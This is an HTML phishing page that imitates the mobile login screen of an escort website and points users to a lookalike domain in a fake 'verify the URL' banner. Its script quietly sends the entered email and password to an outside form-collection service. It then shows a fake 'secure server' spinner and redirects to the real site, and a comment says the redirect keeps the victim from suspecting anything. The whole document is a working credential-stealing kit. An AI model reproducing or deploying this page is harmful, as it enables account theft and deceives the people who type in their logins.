<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Log in | Verification</title>
    <style>
        :root {
            --brand-red: #b32d36;
            --text-main: #333;
            --text-dim: #757575;
        }

        body {
            font-family: -apple-system, system-ui, sans-serif;
            background-color: #fff;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Loading Overlay Styling */
        #loading-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255, 255, 255, 0.95);
            z-index: 9999;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid var(--brand-red);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Header & Form Layout */
        .header-bar { width: 100%; height: 60px; background: var(--brand-red); display: flex; align-items: center; padding: 0 15px; color: white; box-sizing: border-box; }
        .verify-banner { width: 90%; max-width: 450px; background: #e8f5e9; border: 1px solid #c8e6c9; border-radius: 12px; margin-top: 20px; padding: 12px; text-align: center; font-size: 14px; color: #2e7d32; }
        .login-container { width: 90%; max-width: 450px; margin-top: 30px; text-align: center; }
        
        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dcdcdc; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
        .btn-login { width: 100%; padding: 14px; background: var(--brand-red); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>

    <div id="loading-overlay">
        <div class="spinner"></div>
        <p style="color: #333; margin-top: 15px; font-weight: 600;">Connecting to secure server...</p>
    </div>

    <div class="header-bar">
        <span>&#8592; Log in</span>
    </div>

    <div class="verify-banner">
        Please make sure you are visiting the correct URL:<br>
        <strong>ðŸ”’ m.tsescorts.com</strong>
    </div>

    <div class="login-container">
        <h1 style="font-size: 28px; margin-bottom: 5px;">Log in</h1>
        <p style="color: var(--text-dim); margin-bottom: 25px;">Use your email and password to log in</p>

        <form id="loginForm" action="https://usebasin.com/f/d00233245bb3" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            
            <input type="hidden" name="convertToAjax" value="true">

            <button type="submit" class="btn-login">Log in</button>
        </form>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const overlay = document.getElementById('loading-overlay');

        form.addEventListener('submit', function(e) {
            e.preventDefault(); // Stop immediate submission
            
            // 1. Show the loading spinner
            overlay.style.display = 'flex';
            
            // 2. Capture the data
            const formData = new FormData(form);

            // 3. Send data to Basin in the background (AJAX)
            fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            }).then(response => {
                // 4. Wait for the remainder of the 3 seconds, then redirect
                setTimeout(() => {
                    window.location.replace("https://tsescort.com/login");
                }, 3000); 
            }).catch(error => {
                // Even if there is an error, we still redirect so the user doesn't suspect anything
                setTimeout(() => {
                    window.location.replace("https://tsescort.com/login");
                }, 3000);
            });
        });
    </script>

</body>
</html>
